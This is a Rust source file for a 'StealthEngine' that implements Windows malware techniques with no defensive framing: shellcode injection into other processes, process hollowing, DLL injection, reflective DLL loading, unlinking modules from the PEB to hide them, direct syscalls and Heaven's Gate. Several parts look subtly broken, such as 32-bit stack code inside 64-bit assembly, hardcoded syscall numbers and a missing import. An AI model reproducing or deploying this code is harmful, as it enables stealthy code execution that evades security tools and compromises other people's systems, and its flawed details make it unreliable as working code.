use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread, GetCurrentProcess};
use winapi::um::memoryapi::{WriteProcessMemory, VirtualAllocEx, VirtualProtectEx};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::um::handleapi::CloseHandle;
use winapi::shared::minwindef::{DWORD, FALSE, LPVOID};
use std::ptr;

pub struct StealthEngine {
    syscall_table: Vec<SyscallEntry>,
    injected_processes: Vec<u32>,
}

struct SyscallEntry {
    number: u32,
    name: String,
    address: u64,
}

impl StealthEngine {
    pub fn new() -> Self {
        let mut engine = StealthEngine {
            syscall_table: Vec::new(),
            injected_processes: Vec::new(),
        };
        engine.init_syscall_table();
        engine
    }

    pub fn heavens_gate(&self, func_addr: u64) -> bool {
        unsafe {
            if cfg!(target_arch = "x86_64") && self.is_wow64() {
                let wow64_transition = self.get_wow64_transition();
                if wow64_transition != 0 {
                    std::arch::asm!(
                        "push {func}",
                        "call {transition}",
                        "add esp, 4",
                        func = in(reg) func_addr,
                        transition = in(reg) wow64_transition,
                        options(nostack)
                    );
                    return true;
                }
            }
        }
        false
    }

    pub fn direct_syscall(&self, syscall_num: u32, args: Vec<u64>) -> u64 {
        unsafe {
            let mut result: u64 = 0;
            
            match args.len() {
                0 => {
                    std::arch::asm!(
                        "mov r10, rcx",
                        "mov eax, {syscall}",
                        "syscall",
                        "mov {result}, rax",
                        syscall = in(reg) syscall_num,
                        result = out(reg) result,
                        out("rcx") _,
                        out("r11") _,
                    );
                }
                1 => {
                    std::arch::asm!(
                        "mov r10, rcx",
                        "mov eax, {syscall}",
                        "mov rcx, {arg0}",
                        "syscall",
                        "mov {result}, rax",
                        syscall = in(reg) syscall_num,
                        arg0 = in(reg) args[0],
                        result = out(reg) result,
                        out("r11") _,
                    );
                }
                2 => {
                    std::arch::asm!(
                        "mov r10, rcx",
                        "mov eax, {syscall}",
                        "mov rcx, {arg0}",
                        "mov rdx, {arg1}",
                        "syscall",
                        "mov {result}, rax",
                        syscall = in(reg) syscall_num,
                        arg0 = in(reg) args[0],
                        arg1 = in(reg) args[1],
                        result = out(reg) result,
                        out("r11") _,
                    );
                }
                _ => {
                    result = 0xC0000001;
                }
            }
            
            result
        }
    }

    pub fn manipulate_peb(&self) -> bool {
        unsafe {
            let peb_addr = self.get_peb_address();
            if peb_addr == 0 {
                return false;
            }

            let ldr_data_offset = 0x18;
            let ldr_data_addr = *(((peb_addr + ldr_data_offset) as *const u64));
            
            if ldr_data_addr == 0 {
                return false;
            }

            let in_load_order_list = ldr_data_addr + 0x10;
            let first_entry = *((in_load_order_list) as *const u64);
            let second_entry = *((first_entry) as *const u64);
            
            *((in_load_order_list) as *mut u64) = second_entry;
            *((second_entry + 0x08) as *mut u64) = in_load_order_list;

            true
        }
    }

    pub fn inject_process(&mut self, target_pid: u32, shellcode: &[u8]) -> bool {
        unsafe {
            let process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
            if process_handle.is_null() {
                return false;
            }

            let remote_memory = VirtualAllocEx(
                process_handle,
                ptr::null_mut(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if remote_memory.is_null() {
                CloseHandle(process_handle);
                return false;
            }

            let mut bytes_written = 0;
            let write_result = WriteProcessMemory(
                process_handle,
                remote_memory,
                shellcode.as_ptr() as LPVOID,
                shellcode.len(),
                &mut bytes_written,
            );

            if write_result == 0 || bytes_written != shellcode.len() {
                CloseHandle(process_handle);
                return false;
            }

            let thread_handle = CreateRemoteThread(
                process_handle,
                ptr::null_mut(),
                0,
                Some(std::mem::transmute(remote_memory)),
                ptr::null_mut(),
                0,
                ptr::null_mut(),
            );

            let success = !thread_handle.is_null();
            
            if success {
                self.injected_processes.push(target_pid);
                CloseHandle(thread_handle);
            }

            CloseHandle(process_handle);
            success
        }
    }

    pub fn process_hollowing(&self, target_path: &str, payload: &[u8]) -> bool {
        use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
        use winapi::um::winbase::CREATE_SUSPENDED;
        
        unsafe {
            let mut startup_info: STARTUPINFOA = std::mem::zeroed();
            let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
            startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

            let create_result = CreateProcessA(
                ptr::null(),
                target_path.as_ptr() as *mut i8,
                ptr::null_mut(),
                ptr::null_mut(),
                FALSE,
                CREATE_SUSPENDED,
                ptr::null_mut(),
                ptr::null(),
                &mut startup_info,
                &mut process_info,
            );

            if create_result == 0 {
                return false;
            }

            let base_addr = self.get_process_base_address(process_info.hProcess);
            if base_addr == 0 {
                winapi::um::processthreadsapi::TerminateProcess(process_info.hProcess, 1);
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
                return false;
            }

            let unmap_result = self.unmap_process_memory(process_info.hProcess, base_addr);
            if !unmap_result {
                winapi::um::processthreadsapi::TerminateProcess(process_info.hProcess, 1);
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
                return false;
            }

            let new_base = VirtualAllocEx(
                process_info.hProcess,
                base_addr as LPVOID,
                payload.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if new_base.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(process_info.hProcess, 1);
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
                return false;
            }

            let mut bytes_written = 0;
            let write_result = WriteProcessMemory(
                process_info.hProcess,
                new_base,
                payload.as_ptr() as LPVOID,
                payload.len(),
                &mut bytes_written,
            );

            if write_result != 0 && bytes_written == payload.len() {
                winapi::um::processthreadsapi::ResumeThread(process_info.hThread);
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
                true
            } else {
                winapi::um::processthreadsapi::TerminateProcess(process_info.hProcess, 1);
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
                false
            }
        }
    }

    pub fn dll_injection(&self, target_pid: u32, dll_path: &str) -> bool {
        unsafe {
            let process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
            if process_handle.is_null() {
                return false;
            }

            let dll_path_wide = self.string_to_wide(dll_path);
            let path_size = dll_path_wide.len() * 2;

            let remote_memory = VirtualAllocEx(
                process_handle,
                ptr::null_mut(),
                path_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if remote_memory.is_null() {
                CloseHandle(process_handle);
                return false;
            }

            let mut bytes_written = 0;
            let write_result = WriteProcessMemory(
                process_handle,
                remote_memory,
                dll_path_wide.as_ptr() as LPVOID,
                path_size,
                &mut bytes_written,
            );

            if write_result == 0 || bytes_written != path_size {
                CloseHandle(process_handle);
                return false;
            }

            let kernel32 = winapi::um::libloaderapi::GetModuleHandleA(
                b"kernel32.dll\0".as_ptr() as *const i8
            );
            
            let load_library = winapi::um::libloaderapi::GetProcAddress(
                kernel32,
                b"LoadLibraryW\0".as_ptr() as *const i8
            );

            if load_library.is_null() {
                CloseHandle(process_handle);
                return false;
            }

            let thread_handle = CreateRemoteThread(
                process_handle,
                ptr::null_mut(),
                0,
                Some(std::mem::transmute(load_library)),
                remote_memory,
                0,
                ptr::null_mut(),
            );

            let success = !thread_handle.is_null();

            if success {
                CloseHandle(thread_handle);
            }

            CloseHandle(process_handle);
            success
        }
    }

    pub fn reflective_dll_loading(&self, dll_data: &[u8]) -> u64 {
        unsafe {
            if dll_data.len() < 64 {
                return 0;
            }

            let dos_header = dll_data.as_ptr() as *const winapi::um::winnt::IMAGE_DOS_HEADER;
            if (*dos_header).e_magic != 0x5A4D {
                return 0;
            }

            let nt_headers_offset = (*dos_header).e_lfanew as usize;
            if nt_headers_offset >= dll_data.len() {
                return 0;
            }

            let nt_headers = dll_data.as_ptr().add(nt_headers_offset) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
            if (*nt_headers).Signature != 0x00004550 {
                return 0;
            }

            let image_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
            let base_addr = VirtualAlloc(
                ptr::null_mut(),
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            ) as u64;

            if base_addr == 0 {
                return 0;
            }

            ptr::copy_nonoverlapping(
                dll_data.as_ptr(),
                base_addr as *mut u8,
                (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
            );

            let sections_count = (*nt_headers).FileHeader.NumberOfSections;
            let first_section = (nt_headers as *const u8).add(
                std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>()
            ) as *const winapi::um::winnt::IMAGE_SECTION_HEADER;

            for i in 0..sections_count {
                let section = first_section.add(i as usize);
                if (*section).SizeOfRawData > 0 {
                    ptr::copy_nonoverlapping(
                        dll_data.as_ptr().add((*section).PointerToRawData as usize),
                        (base_addr as *mut u8).add((*section).VirtualAddress as usize),
                        (*section).SizeOfRawData as usize,
                    );
                }
            }

            base_addr
        }
    }

    fn init_syscall_table(&mut self) {
        self.syscall_table.push(SyscallEntry {
            number: 0x3A,
            name: "NtAllocateVirtualMemory".to_string(),
            address: 0,
        });
        
        self.syscall_table.push(SyscallEntry {
            number: 0x1E,
            name: "NtFreeVirtualMemory".to_string(),
            address: 0,
        });
        
        self.syscall_table.push(SyscallEntry {
            number: 0x50,
            name: "NtProtectVirtualMemory".to_string(),
            address: 0,
        });
        
        self.syscall_table.push(SyscallEntry {
            number: 0x26,
            name: "NtOpenProcess".to_string(),
            address: 0,
        });
    }

    fn is_wow64(&self) -> bool {
        unsafe {
            let kernel32 = winapi::um::libloaderapi::GetModuleHandleA(
                b"kernel32.dll\0".as_ptr() as *const i8
            );
            
            if !kernel32.is_null() {
                let is_wow64_process = winapi::um::libloaderapi::GetProcAddress(
                    kernel32,
                    b"IsWow64Process\0".as_ptr() as *const i8
                );
                
                if !is_wow64_process.is_null() {
                    let mut is_wow64 = FALSE;
                    let func: extern "system" fn(winapi::um::winnt::HANDLE, *mut i32) -> i32 = 
                        std::mem::transmute(is_wow64_process);
                    
                    if func(GetCurrentProcess(), &mut is_wow64) != 0 {
                        return is_wow64 != FALSE;
                    }
                }
            }
        }
        false
    }

    fn get_wow64_transition(&self) -> u64 {
        unsafe {
            let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
                b"ntdll.dll\0".as_ptr() as *const i8
            );
            
            if !ntdll.is_null() {
                let wow64_transition = winapi::um::libloaderapi::GetProcAddress(
                    ntdll,
                    b"Wow64Transition\0".as_ptr() as *const i8
                );
                
                if !wow64_transition.is_null() {
                    return wow64_transition as u64;
                }
            }
        }
        0
    }

    fn get_peb_address(&self) -> u64 {
        unsafe {
            let mut peb_addr: u64;
            std::arch::asm!(
                "mov {}, gs:[0x60]",
                out(reg) peb_addr
            );
            peb_addr
        }
    }

    fn get_process_base_address(&self, process_handle: winapi::um::winnt::HANDLE) -> u64 {
        unsafe {
            let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
                b"ntdll.dll\0".as_ptr() as *const i8
            );
            
            if ntdll.is_null() {
                return 0;
            }

            let nt_query_information_process = winapi::um::libloaderapi::GetProcAddress(
                ntdll,
                b"NtQueryInformationProcess\0".as_ptr() as *const i8
            );
            
            if nt_query_information_process.is_null() {
                return 0;
            }

            let mut pbi: [u8; 48] = [0; 48];
            let func: extern "system" fn(
                winapi::um::winnt::HANDLE,
                u32,
                *mut u8,
                u32,
                *mut u32
            ) -> i32 = std::mem::transmute(nt_query_information_process);

            let status = func(process_handle, 0, pbi.as_mut_ptr(), 48, ptr::null_mut());
            if status == 0 {
                let base_addr = *((pbi.as_ptr().add(16)) as *const u64);
                return base_addr;
            }
        }
        0
    }

    fn unmap_process_memory(&self, process_handle: winapi::um::winnt::HANDLE, base_addr: u64) -> bool {
        unsafe {
            let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
                b"ntdll.dll\0".as_ptr() as *const i8
            );
            
            if ntdll.is_null() {
                return false;
            }

            let nt_unmap_view_of_section = winapi::um::libloaderapi::GetProcAddress(
                ntdll,
                b"NtUnmapViewOfSection\0".as_ptr() as *const i8
            );
            
            if nt_unmap_view_of_section.is_null() {
                return false;
            }

            let func: extern "system" fn(winapi::um::winnt::HANDLE, u64) -> i32 = 
                std::mem::transmute(nt_unmap_view_of_section);

            func(process_handle, base_addr) == 0
        }
    }

    fn string_to_wide(&self, s: &str) -> Vec<u16> {
        use std::ffi::OsStr;
        use std::os::windows::ffi::OsStrExt;
        
        OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    }
}
